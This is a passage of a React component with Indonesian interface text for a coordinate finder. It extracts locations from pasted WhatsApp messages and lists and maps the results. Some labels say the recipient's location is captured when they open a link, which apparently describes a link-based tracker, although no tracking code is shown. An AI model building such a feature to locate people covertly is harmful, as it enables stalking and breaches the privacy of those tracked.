                  Cari Titik Koordinat dari Teks yang Sudah Dicopy
                </h2>
              </div>

              <p className="text-xs text-slate-600 leading-relaxed mb-3">
                Tempelkan teks pesan WhatsApp yang sudah Anda salin (*copy*) atau langsung klik tombol pencarian di bawah.
              </p>

              <div className="relative">
                <textarea
                  ref={textareaRef}
                  value={messageInput}
                  onChange={(e) => setMessageInput(e.target.value)}
                  onPaste={handleTextareaPaste}
                  rows={6}
                  placeholder="Tempel (Paste / Ctrl+V) teks pesan WhatsApp yang sudah dicopy di sini..."
                  className="w-full p-3.5 pr-10 text-xs font-mono bg-slate-50 border border-slate-200 rounded-lg text-slate-900 focus:outline-none focus:border-slate-900 resize-y"
                />
                {messageInput && (
                  <button
                    type="button"
                    onClick={() => setMessageInput('')}
                    className="absolute right-3 top-3 text-slate-400 hover:text-slate-700"
                    title="Bersihkan teks"
                  >
                    <X className="w-4 h-4" />
                  </button>
                )}
              </div>
            </div>

            <div className="pt-4 mt-5 border-t border-slate-200 flex items-center justify-end">
              <button
                type="button"
                onClick={handleSearchFromCopiedText}
                className="w-full inline-flex items-center justify-center gap-2 px-5 py-2.5 text-xs font-semibold text-white bg-slate-900 hover:bg-slate-800 rounded-md transition-colors whitespace-nowrap shrink-0 cursor-pointer"
              >
                <Search className="w-4 h-4" />
                <span>Cari Titik Koordinat dari Teks yang Dicopy</span>
              </button>
            </div>
          </section>
        </div>

        {/* Highlighted Instant Coordinate Output for the Active Result */}
        {activeResult && (
          <section className="p-5 rounded-lg bg-slate-900 text-white flex flex-col lg:flex-row lg:items-center justify-between gap-4">
            <div className="space-y-1">
              <div className="text-xs text-emerald-400 font-medium">
                Lokasi Penerima Langsung Terlihat · {activeResult.detectionMethod}
              </div>
              <div className="text-xl sm:text-2xl font-bold font-mono tabular-nums text-white tracking-tight">
                {activeResult.latitude.toFixed(6)}, {activeResult.longitude.toFixed(6)}
              </div>
              <div className="text-xs text-slate-300">
                Latitude: <strong className="font-mono tabular-nums">{activeResult.latitude.toFixed(6)}</strong> · Longitude: <strong className="font-mono tabular-nums">{activeResult.longitude.toFixed(6)}</strong> · DMS: <span className="font-mono tabular-nums">{activeResult.dmsString}</span>
              </div>
              <div className="text-xs text-slate-200 pt-0.5 font-medium">
                Alamat / Wilayah: {activeResult.locationLabel}
              </div>
            </div>

            <div className="flex flex-wrap items-center gap-2 shrink-0">
              <button
                type="button"
                onClick={() =>
                  handleCopyText(
                    `${activeResult.latitude.toFixed(6)}, ${activeResult.longitude.toFixed(6)}`,
                    `banner-${activeResult.id}`
                  )
                }
                className="inline-flex items-center gap-1.5 px-3.5 py-2 text-xs font-medium text-slate-900 bg-white hover:bg-slate-100 rounded-md transition-colors whitespace-nowrap shrink-0"
              >
                {copiedId === `banner-${activeResult.id}` ? (
                  <>
                    <Check className="w-3.5 h-3.5 text-emerald-600" />
                    <span>Koordinat Tersalin</span>
                  </>
                ) : (
                  <>
                    <Copy className="w-3.5 h-3.5" />
                    <span>Salin Koordinat</span>
                  </>
                )}
              </button>

              <a
                href={`https://www.google.com/maps?q=${activeResult.latitude},${activeResult.longitude}`}
                target="_blank"
                rel="noopener noreferrer"
                className="inline-flex items-center gap-1.5 px-3.5 py-2 text-xs font-medium text-white bg-emerald-600 hover:bg-emerald-700 rounded-md transition-colors whitespace-nowrap shrink-0"
              >
                <span>Buka Google Maps</span>
                <ExternalLink className="w-3.5 h-3.5" />
              </a>

              <button
                type="button"
                onClick={() => handleDeleteResult(activeResult.id)}
                className="inline-flex items-center gap-1.5 px-3.5 py-2 text-xs font-medium text-red-200 bg-red-950/80 hover:bg-red-900 border border-red-800 rounded-md transition-colors whitespace-nowrap shrink-0"
                title="Hapus hasil pencarian ini"
              >
                <Trash2 className="w-3.5 h-3.5" />
                <span>Hapus</span>
              </button>
            </div>
          </section>
        )}

        {/* Search Results & Map Grid */}
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
          {/* Left Column: Daftar Hasil Pencarian (with Delete Button on every item) */}
          <section
            id="hasil-pencarian"
            className="lg:col-span-6 bg-white border border-slate-200 rounded-lg overflow-hidden"
          >
            <div className="p-5 border-b border-slate-200 flex items-center justify-between gap-4">
              <div>
                <h2 className="text-base font-semibold text-slate-900">
                  Hasil Pencarian Titik Koordinat ({allResults.length})
                </h2>
                <p className="text-xs text-slate-500 mt-0.5">
                  Menampilkan lokasi yang diperoleh saat link dibuka maupun dari teks pesan WA.
                </p>
              </div>

              <div className="flex items-center gap-2">
                {allResults.length > 0 && (
                  <button
                    type="button"
                    onClick={handleDeleteAllResults}
                    className="inline-flex items-center gap-1.5 px-3 py-1.5 text-xs font-medium text-red-700 bg-red-50 hover:bg-red-100 rounded-md transition-colors whitespace-nowrap shrink-0"
                  >
                    <Trash2 className="w-3.5 h-3.5" />
                    <span>Hapus Semua</span>
                  </button>
                )}
              </div>
            </div>

            {allResults.length === 0 ? (
              <div className="p-10 text-center">
                <MapPin className="w-8 h-8 text-slate-400 mx-auto mb-2.5" />
                <div className="text-sm font-semibold text-slate-900">
                  Belum Ada Lokasi yang Masuk
                </div>
                <p className="text-xs text-slate-500 max-w-sm mx-auto mt-1">
                  Klik tombol <strong>Klik &amp; Buka Link (Tampilkan Lokasi Sekarang)</strong> atau gunakan tombol <strong>Cari Titik Koordinat dari Teks yang Dicopy</strong> di atas.
                </p>
              </div>
            ) : (
              <div className="divide-y divide-slate-200">
                {allResults.map((item, idx) => {
                  const isSelected = activeResult?.id === item.id;
                  const coordPair = `${item.latitude.toFixed(6)}, ${item.longitude.toFixed(6)}`;

                  return (
                    <div
                      key={item.id}
                      onClick={() => setSelectedResultId(item.id)}
                      className={`p-5 cursor-pointer transition-colors ${
                        isSelected ? 'bg-emerald-50/50' : 'hover:bg-slate-50'
                      }`}
                    >
                      <div className="flex items-start justify-between gap-3 mb-2">
                        <div className="text-xs text-slate-500">
                          <strong className="font-mono tabular-nums text-slate-900">
                            #{idx + 1}
                          </strong>{' '}
                          · {item.sender} · {item.messageTime} · {item.detectionMethod}
                        </div>

                        <button
                          type="button"
                          onClick={(e) => {
                            e.stopPropagation();
                            handleDeleteResult(item.id);
                          }}
                          className="inline-flex items-center gap-1 px-2.5 py-1 text-xs font-medium text-red-700 bg-red-50 hover:bg-red-100 rounded transition-colors whitespace-nowrap shrink-0"
                          title="Hapus hasil pencarian ini"
                        >
                          <Trash2 className="w-3.5 h-3.5" />
                          <span>Hapus</span>
                        </button>
                      </div>

                      <div className="p-3 rounded-md bg-white border border-slate-200 mb-2.5 flex flex-wrap items-center justify-between gap-2">
                        <div>
                          <div className="text-[11px] text-slate-500">
                            Titik Koordinat (Latitude, Longitude)
                          </div>
                          <div className="text-base font-bold font-mono tabular-nums text-emerald-700">
                            {coordPair}
                          </div>
                          <div className="text-[11px] font-mono tabular-nums text-slate-500">
                            DMS: {item.dmsString}
                          </div>
                        </div>

                        <div
                          className="flex items-center gap-1.5"
                          onClick={(e) => e.stopPropagation()}
                        >
                          <button
                            type="button"
                            onClick={() => handleCopyText(coordPair, item.id)}
                            className="inline-flex items-center gap-1 px-2.5 py-1.5 text-xs font-medium text-slate-700 bg-slate-100 hover:bg-slate-200 rounded transition-colors whitespace-nowrap shrink-0"
                          >
                            {copiedId === item.id ? (
                              <>
                                <Check className="w-3.5 h-3.5 text-emerald-600" />
                                <span>Tersalin</span>
                              </>
                            ) : (
                              <>
                                <Copy className="w-3.5 h-3.5" />
                                <span>Salin</span>
                              </>
                            )}
                          </button>

                          <a
                            href={`https://www.google.com/maps?q=${item.latitude},${item.longitude}`}
                            target="_blank"
                            rel="noopener noreferrer"
                            className="inline-flex items-center gap-1 px-2.5 py-1.5 text-xs font-medium text-emerald-700 bg-emerald-50 hover:bg-emerald-100 rounded transition-colors whitespace-nowrap shrink-0"
                          >
                            <span>Peta</span>
                            <ExternalLink className="w-3 h-3" />
                          </a>
                        </div>
                      </div>

                      <div className="text-xs text-slate-800 font-medium mb-1">
                        Lokasi: {item.locationLabel}
                      </div>
                      <div className="text-xs text-slate-500 font-mono bg-slate-100/80 px-2.5 py-1.5 rounded border border-slate-200/80 break-words">
                        "{item.rawMessage}"
                      </div>
                    </div>
                  );
                })}
              </div>
            )}
          </section>

          {/* Right Column: Interactive Map */}
          <section
            id="peta-lokasi"
            className="lg:col-span-6 bg-white border border-slate-200 rounded-lg p-4 flex flex-col lg:sticky lg:top-20"
          >
            <div className="pb-3 mb-3 border-b border-slate-200 px-2">
              <h2 className="text-base font-semibold text-slate-900">
                Peta Titik Koordinat
              </h2>
              <p className="text-xs text-slate-500 mt-0.5">
                Menampilkan posisi titik koordinat secara langsung saat link dibuka penerima.
              </p>
            </div>

            <div className="h-[460px]">
              <InteractiveMap
                locations={mapLocations}
                selectedId={activeResult?.id || null}
                onSelectLocation={(id) => setSelectedResultId(id)}
              />
            </div>
          </section>
        </div>
      </main>
    </div>
  );
}
